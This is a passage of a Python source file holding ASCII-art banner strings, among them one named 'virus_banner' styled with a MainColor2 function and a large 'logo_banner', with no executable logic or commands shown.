             #*   :%@@@@@@@@@@:   .@@#*              ..  ##@ *#@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@-:- %=         
                   *@@@@@@@@@@@@%@@@@@@@            = @=+@@@@%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@+   #.        
                   #@@@@@@@@@##@@@@@= =#              #@@@#@@@@%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@=            
                  @@@@@@@@@@@#+#@@=                 :@@@-.#-*#@.  .@@.=%@@@@%@@@@@@@@@@@@@@@@@=  +          
                 :@@@@@@@@@@@@@@:                   :@@    # - @@@@@@@ =@@@*#*@@@@@@@@@@@@@=.=-  #:         
                  :@@@@@@@@@@@+                     @@@@@@@: :    @@@@@@@@@@@@@@@@@@@@@@@@@@@               
                   #@@@@@    @                     #%@@@@@@@@@@@@@@@@@:@@@@@@@@@@@@#@@@@@@@@@:              
                     @@@     .                    @@@@@@@@@@@@@@@@-%@@@%@#   @@@@@@#=@#@@@@@==              
                     =@@##@   =:*.                @@@@@@*@@@@@@@@@@-=@@@@.    +@@@:  %#@@#=   :             
                         .=@.                     #@@@@@@@@#@@@@@@@@+#:        %@      *%@=                 
                            . @@@@@@               @#@@*@@@@@@@@@@@@@@@=        :-     -       =.           
                             :@@@@@@@#=                   @@@@@@@@@@@@-               :+%  .@=              
                            -@@@@@@@@@@@@                 @+@@@@*+@@#                   @. @@.#   # :       
                             @@@@@@@@@@@@@@@               @@@@@*@@@                     :=.        @@@.    
                              @@@@@@@@@@@@@                #@@@@@@%@.                             :  :      
                               *@@@@@@@@@@%               :@@@@@@@@@ @@.                      .@@@@=:@      
                                :@@@@@@@@@                 #@@@@@@   @:                    .#@@@@@@@@@@     
                                :@@@@%@@                   .@@@@@-   .                     @@@@@@@@@@@@*    
                                :@@@@@@.                    *@@@-                          @@@@#@@@@@@@     
                                .@@@@@                                                           =@@@:    @=
                                 =@@                                                              =    #+   
                                  @%                                                                        
""")



virus_banner = MainColor2(r"""
                                                         ...                                       
                                                  +%@@@@@@@@@@@@@*.                                
                                               #@@@@@@@@@@@@@@@@@@@@@:                             
                                             %@@@@@@@@@@@@@@@@@@@@@@@@@:                           
                                           .@@@@@@@@@@@@@@@@@@@@@@@@@@@@:                          
                                           :@@@@@@@@@@@@@@@@@@@@@@@@@@@@%                          
                                           =@@@@@@@@@@@@@@@@@@@@@@@@@@@@%                          
                                           :@@@@@@@@@@@@@@@@@@@@@@@@@@@@*                          
                                            #@@@%.     .@@@@+      #@@@%                           
                                             +@@=      .@@@@=      .@@#                            
                                              @@@@%%%@@@@%*@@@@%%%@@@@=                            
                                             .@@@@@@@@@@*  -@@@@@@@@@@=                            
                                           .    .::-@@@@@@@@@@@@+::.    .                          
                                         *@@@@#     @@@@@@@@@@@@-    +@@@@@.                       
                                         #@@@@@%    -%@@@@@@@@%=.   *@@@@@@:                       
                                       @@@@@@@@@@@@:            .#@@@@@@@@@@@-                     
                                       +@@@@@*#@@@@@@@@*:  .+@@@@@@@@%*%@@@@#                      
                                                    *@@@@@@@@@@%.                                  
                                        .==.    .+%@@@@@@@%@@@@@@@+:     :=:                       
                                       @@@@@@@@@@@@@@*.       :@@@@@@@@@@@@@@=                     
                                       -@@@@@@@@%=                :#@@@@@@@@*                      
                                         *@@@@@:                     %@@@@@:                       
                                         :%@@%.                       *@@@=                       
""")



logo_banner = r"""
                                         █████████████████████████████████████                                        
                                   ██████                  █                  ██████                                   
                               ██████                                             ██████                               
               ███████████████████                         █                         ███████████████████               
         █████           █████                      ██  ███ ███  ██                      █████           █████         
        ████           █████      ██   ██████       ████       ████       ██████   ██      █████           ████        
        ███           ████     ███   ███     ██████████         ██████████      ██   ███     ████           ███        
        ████         ████      ███             ████████         ████████             ███      ████         ████        
         ████      ██████      ████ ██████████  ████               ████  ███████████████      ██████      ████         
          ██████  █████              ██  ████ ██                       ██ ████  ██              █████  ██████         
            ███████████         ███   ██      ███████████     ███████████      ██   ███         ███████████     
              ██████████    ███ █████                                             █████ ███    ██████████  
                 ██████    ███     ██████        ███                ██        ██████     ███    ██████                 
                ███       ████                   ████     ███     ████                   ████       ████               
              ████        ████    ██             ██                 ██             ██    ████         ███              
             █████          ███████            ██████ ███████████ ██████            ███████          █████             
              ██     █      ███████              ███               ███              ███████      █     ██              
            ███     ██      ███████                █████       █████                ███████      ██     ███            
           ███      ███      ███████                 ███       ███                 ███████      ███      ███           
          ███       ████     ████████                    ██████                   ████████     █████      ███          
          ███      ████      ██    █████                  ███                  █████    ███     ████      ███          
          ███      ████            █ █████████████████████████████████████████████ █             ███      ███          
          █████     ███        █        ██████    ██  ███  ██  ██  ██    ██████        █         ██     █████          
          █████     █████     ██         █████    ██  ███  ██  ██  ██    █████         ██     ████      █████          
            ███      ████    █████  ██    █████    █████████████████    █████    ██  █████    ████      ███            
             █████    ████     ███████    ██████  ███████████████████  ██████    ███████     ████    █████             
             ██████    █████    ████████   █████████████████████████████████   ████████    █████    ██████             
              ██████    █ ████    █  ████     ███████████████████████████     ████  ██   ████ █    ██████              
                █████        ██      █████    █████ ███████████████ █████    █████      ██        █████                
                  ████        ██     ████     ████   █████████████   ████     ████     ██        ████                  
                   ████  █     █     ████     ███     ███████████     ███     ████     █     █  ████                   
                    ████████            ██    ██      █    █    █      ██    ██            ████████                    
                     █████████      █   ████   █████████████████████████   ████   █      █████████                     
                         ██████    ███  █████          █████████          █████  ███    ██████  █                      
                           ██████ █████████████           ███           █████████████ ██████                           
                            █████████████   ██████                   ██ ███   █████████████                            
                              █████            ███████████████████ █████            █████                              
                               ███              ███████████████████████               ██                               
                                                       █████████                                                       
                                                         █████                                                         
                                                           █                                                           
"""